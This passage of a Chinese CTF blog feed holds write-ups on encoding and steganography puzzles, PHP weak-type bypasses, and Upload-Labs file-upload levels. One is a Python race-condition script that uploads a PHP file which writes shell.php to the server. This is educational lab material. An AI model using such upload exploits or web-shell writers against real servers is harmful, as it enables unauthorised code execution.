&lt;/code>&lt;/pre>&lt;p>&lt;strong>base58解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>JZVFSMSZPJMXQTTKMMZVS2TDGVGXUQJTJZKFM3KONJCTEWL2MN4U26SNGJGVIWJQJZ5GWMK2NJNGSTTNKV5E2RDDGNHFOWJTJZCFSNCNPJGTCWTKKF4U42SFGNGXUWJRJZVFSMSNKRNGWTL2IUZFS6TDGVHDEUJ5
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base32解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>NjY2YzYxNjc3Yjc5MzA3NTVmNjE2YzcyMzM2MTY0Nzk1ZjZiNmUzMDc3NWY3NDY4MzM1ZjQyNjE3MzY1NjY2MTZkMzE2Yzc5N2Q=
&lt;/code>&lt;/pre>&lt;p>&lt;strong>base64解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>666c61677b7930755f616c72336164795f6b6e30775f7468335f4261736566616d316c797d
&lt;/code>&lt;/pre>&lt;p>&lt;strong>hex解码&lt;/strong>：&lt;/p>
&lt;pre tabindex="0">&lt;code>flag{y0u_alr3ady_kn0w_th3_Basefam1ly}
&lt;/code>&lt;/pre>&lt;h2 id="slienteye">SlientEye&lt;/h2>
&lt;p>根据题目直接百度&lt;strong>SlientEye&lt;/strong>，下载以后打开图片&amp;ndash;&amp;gt;decode：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130105145.png" alt="">&lt;/p>
&lt;p>参数啥的都没动，密码为默认密码，直接Decode，得到一个flag.txt：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;amp;#102;&amp;amp;#108;&amp;amp;#97;&amp;amp;#103;&amp;amp;#123;&amp;amp;#110;&amp;amp;#49;&amp;amp;#95;&amp;amp;#98;&amp;amp;#117;&amp;amp;#95;&amp;amp;#106;&amp;amp;#49;&amp;amp;#97;&amp;amp;#110;&amp;amp;#103;&amp;amp;#95;&amp;amp;#119;&amp;amp;#117;&amp;amp;#95;&amp;amp;#100;&amp;amp;#51;&amp;amp;#125;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再去百度搜到一篇博客：&lt;a href="https://www.cnblogs.com/philipding/p/10153094.html">&amp;amp;#x开头的是什么编码?&lt;/a>，&lt;del>我点开一看，哦，原来是&lt;/del>entity code实体编码，&lt;del>我啪的一下就&lt;/del>把flag.txt改为flag.html，&lt;del>很快啊，然后是一个左正蹬、一个右鞭腿、一个左刺拳&lt;/del>打开flag.html获得flag：&lt;strong>flag{n1_bu_j1ang_wu_d3}&lt;/strong>&lt;/p>
&lt;h2 id="编码之王">编码之王&lt;/h2>
&lt;p>下载文件打开后一堆社会主义核心价值观，前面提到的：&lt;a href="http://ctf.ssleye.com/">CTF在线工具&lt;/a>就有核心价值观编码，下面放密文，上面是解码内容。&lt;/p>
&lt;p>解出来以后看到第一句：&lt;code>如是我闻:&lt;/code>，&amp;ndash;&amp;gt;&lt;a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅&lt;/a>&lt;/p>
&lt;p>再解之后看第一句：&lt;code>新佛曰：&lt;/code>。&amp;ndash;&amp;gt;&lt;a href="http://hi.pcmoe.net/buddha.html">新与佛论禅&lt;/a>&lt;/p>
&lt;p>解完以后直接出了一堆由：&lt;code>[、]、!、+、(、)&lt;/code>组成的符号，还是百度找到了这种编码叫JSfuck，可以直接浏览器控制台console输出获得flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130110943.png" alt="">&lt;/p>
&lt;h2 id="jpgsteg">jpgsteg&lt;/h2>
&lt;p>题目即是用到的工具，百度下载软件，使用jphide.exe打开图片&lt;code>Tap code.jpg&lt;/code>，选择seek功能解密，密码为123456（我蒙的）：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111311.png" alt="">&lt;/p>
&lt;p>成功解密后获得一个文档，内容如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>... ....
.. ...
.. ...
. .
... ..
. .
..... .....
.. ....
... ...
.. ..
&lt;/code>&lt;/pre>&lt;p>这里我思索了好久，刚开始以为是摩斯密码，但是又对不上号，最后找到了一个名为敲击码的，正好一行中的&lt;code>.&lt;/code>分成两部分代表坐标&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130111538.png" alt="">&lt;/p>
&lt;p>解码得到：&lt;code>ohhamazing&lt;/code> ，加上括号就是：&lt;strong>flag{ohhamazing}&lt;/strong>&lt;/p>
&lt;p>事后多看了一眼图片命名：&lt;code>Tap code.jpg&lt;/code>。这用啥解密不就在脸上写着的&lt;del>wosabi \0/&lt;/del>。。。&lt;/p>
&lt;h2 id="collision">Collision&lt;/h2>
&lt;p>打开压缩包发现都是加密，但是原始大小都为4，只有CRC不一样：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201201102424.png" alt="">&lt;/p>
&lt;p>所以很有可能是四位数据的CRC32碰撞，就去网上找了一个python脚本：&lt;a href="https://blog.csdn.net/weixin_45396639/article/details/103393759">crc32碰撞 ctf python&lt;/a>作者原创的脚本：&lt;/p></description></item><item><title>DMCTF之Web</title><link>/posts/ctf/dmctf%E4%B9%8Bweb/</link><pubDate>Sun, 29 Nov 2020 23:17:50 +0000</pubDate><guid>/posts/ctf/dmctf%E4%B9%8Bweb/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>比赛地址：&lt;a href="http://dmctf.vaala.cloud:81/">http://dmctf.vaala.cloud:81&lt;/a>&lt;/p>
&lt;p>这次先写Web题目部分，我最后的排名：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201130085338.png" alt="img">&lt;/p>
&lt;h1 id="web">Web&lt;/h1>
&lt;h2 id="weak_type">weak_type&lt;/h2>
&lt;p>源码：&lt;/p>
&lt;pre tabindex="0">&lt;code>PHP
&amp;lt;?php

show_source(__FILE__);
include(&amp;#39;class.php&amp;#39;);

//level1 

if(isset($_GET[&amp;#39;num&amp;#39;])){
 $num = $_GET[&amp;#39;num&amp;#39;];
 if($num===&amp;#34;202020020&amp;#34;){
 die(&amp;#34;no no no!&amp;#34;);
 }
 if(intval($num,0)===202020020){
 echo &amp;#34;&amp;lt;br&amp;gt; level 1 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;what are you doing?&amp;#39;);
 }
}else{
 die();
}

//level 2

if(isset($_GET[&amp;#39;v1&amp;#39;]) &amp;amp;&amp;amp; isset($_GET[&amp;#39;v2&amp;#39;])){
 $v1 = $_GET[&amp;#39;v1&amp;#39;];
 $v2 = $_GET[&amp;#39;v2&amp;#39;];
 if($v1 != $v2 &amp;amp;&amp;amp; md5($v1)==md5($v2)){
 echo &amp;#34;&amp;lt;br&amp;gt; level 2 Ok &amp;lt;br&amp;gt;&amp;#34;;
 }else{
 die(&amp;#39;Are you kidding me ?&amp;#39;);
 }
}else{
 die();
}

//level 3 

if (isset($_POST[&amp;#39;message&amp;#39;])) {
 $message = json_decode($_POST[&amp;#39;message&amp;#39;]);
 if ($message-&amp;gt;key == $key) {
 echo &amp;#34;&amp;lt;br&amp;gt; Wow you got it !!! &amp;lt;br&amp;gt;&amp;#34;;
 echo file_get_contents(&amp;#39;/flag&amp;#39;);
 } 
 else {
 die(&amp;#34;fail&amp;#34;);
 }
 }
else{
 echo &amp;#34;~~~~&amp;#34;;
 }
&lt;/code>&lt;/pre>&lt;p>&lt;strong>第一关&lt;/strong>利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造&lt;code>num=202020020a&lt;/code>，即可。&lt;/p></description></item><item><title>Upload-Labs的最后几道题</title><link>/posts/ctf/upload-labs5/</link><pubDate>Thu, 19 Nov 2020 08:47:19 +0000</pubDate><guid>/posts/ctf/upload-labs5/</guid><description>&lt;h2 id="pass-17">Pass-17&lt;/h2>
&lt;p>​	（windows环境，php版本5.2.17，题号是18题）&lt;/p>
&lt;p>源码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ext_arr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;jpg&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;png&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;gif&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_name &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $temp_file &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_ext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>($file_name,&lt;span style="color:#a6e22e">strrpos&lt;/span>($file_name,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>)&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $upload_file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $file_name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($temp_file, $upload_file)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">in_array&lt;/span>($file_ext,$ext_arr)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#a6e22e">rand&lt;/span>(&lt;span style="color:#ae81ff">10&lt;/span>, &lt;span style="color:#ae81ff">99&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">date&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;YmdHis&amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$file_ext;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">rename&lt;/span>($upload_file, $img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传.jpg|.png|.gif类型文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">unlink&lt;/span>($upload_file);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;上传出错！&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	思路和前面的一样，获取文件信息，移动文件到&lt;strong>upload&lt;/strong>文件夹，第12行使用了白名单验证，多了第14行的&lt;code>rename&lt;/code>函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了&lt;strong>上传竞争&lt;/strong>，使用&lt;code>python&lt;/code>脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码&lt;code>&amp;lt;?php fputs(fopen('shell.php','w'),'&amp;lt;?php phpinfo();?&amp;gt;');?&amp;gt;&lt;/code>这段代码执行以后，会创建一个名为&lt;code>shell.php&lt;/code>里面有一句&lt;code>&amp;lt;?php phpinfo();?&amp;gt;&lt;/code>的文件。&lt;/p>
&lt;p>​	脚本代码&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#coding=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> multiprocessing &lt;span style="color:#f92672">import&lt;/span> Pool
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">CompeteUpload&lt;/span>(list):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/Pass-18/index.php&amp;#34;&lt;/span> &lt;span style="color:#75715e">#上传页面&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> geturl&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upload-labs/upload/233.php&amp;#34;&lt;/span>	 &lt;span style="color:#75715e">#访问上传文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>:(&lt;span style="color:#e6db74">&amp;#39;233.php&amp;#39;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php fputs(fopen(&amp;#39;shell.php&amp;#39;,&amp;#39;w&amp;#39;),&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;);?&amp;gt;&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;image/jpeg&amp;#39;&lt;/span>)}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> data&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>:&lt;span style="color:#e6db74">&amp;#39;上传&amp;#39;&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>post(url&lt;span style="color:#f92672">=&lt;/span>url,data&lt;span style="color:#f92672">=&lt;/span>data,files&lt;span style="color:#f92672">=&lt;/span>file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#print &amp;#34;test upload....&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r1&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">=&lt;/span>geturl)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> r1&lt;span style="color:#f92672">.&lt;/span>status_code&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#ae81ff">200&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print (&lt;span style="color:#e6db74">&amp;#34;upload success!&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool &lt;span style="color:#f92672">=&lt;/span> Pool(&lt;span style="color:#ae81ff">10&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>map(CompeteUpload, range(&lt;span style="color:#ae81ff">10000&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pool&lt;span style="color:#f92672">.&lt;/span>join()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	第一次用python的我在这里知道了&lt;code>pip&lt;/code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工&lt;/p></description></item><item><title>Upload-Labs之Pass-16</title><link>/posts/ctf/upload-labs4/</link><pubDate>Mon, 16 Nov 2020 22:50:25 +0000</pubDate><guid>/posts/ctf/upload-labs4/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。&lt;/p>
&lt;p>​	参考博客：&lt;a href="https://xz.aliyun.com/t/2657#toc-4">upload-labs之pass 16详细分析&lt;/a>&lt;/p>
&lt;h2 id="pass-16">Pass-16&lt;/h2>
&lt;p>​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>$is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;submit&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $filename &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filetype &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $tmpname &lt;span style="color:#f92672">=&lt;/span> $_FILES[&lt;span style="color:#e6db74">&amp;#39;upload_file&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;tmp_name&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $target_path&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">basename&lt;/span>($filename);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获得上传文件的扩展名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $fileext&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">strrchr&lt;/span>($filename,&lt;span style="color:#e6db74">&amp;#34;.&amp;#34;&lt;/span>),&lt;span style="color:#ae81ff">1&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//判断文件后缀与类型，合法才进行上传操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jpg&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/jpeg&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">move_uploaded_file&lt;/span>($tmpname,$target_path)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//使用上传的图片生成新的图片
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $im &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">imagecreatefromjpeg&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($im &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;该文件不是jpg格式的图片！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//给新图片指定文件名
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">srand&lt;/span>(&lt;span style="color:#a6e22e">time&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $newfilename &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">strval&lt;/span>(&lt;span style="color:#a6e22e">rand&lt;/span>())&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.jpg&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//显示二次渲染后的图片（使用用户上传图片生成的新图片）
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $img_path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">UPLOAD_PATH&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$newfilename;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">imagejpeg&lt;/span>($im,$img_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#a6e22e">unlink&lt;/span>($target_path);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $is_upload &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;上传出错！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;png&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/png&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">......&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span>(($fileext &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gif&amp;#34;&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ($filetype&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#34;image/gif&amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;只允许上传后缀为.jpg|.png|.gif的图片文件！&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>​	提示：&lt;code>本pass重新渲染了图片！&lt;/code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。&lt;/p></description></item><item><title>Upload-Labs(三)</title><link>/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>​	继续接着上一次的&lt;code>Upload-labs&lt;/code>往下写。这记下第11-15题，目前进度是20题都已经完成正在抽时间写博客，然后16题是我卡的最久的关，不过也学到了感觉很牛的姿势，所以到时候专门开一篇只讲16。&lt;/p>
&lt;p>​	在线靶机地址：&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://buuoj.cn/challenges#Upload-Labs-Linux">linux环境&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://buuoj.cn/challenges#%5BWindows%5DUpload-Labs-Windows">windows环境&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="pass-11">Pass-11&lt;/h2>
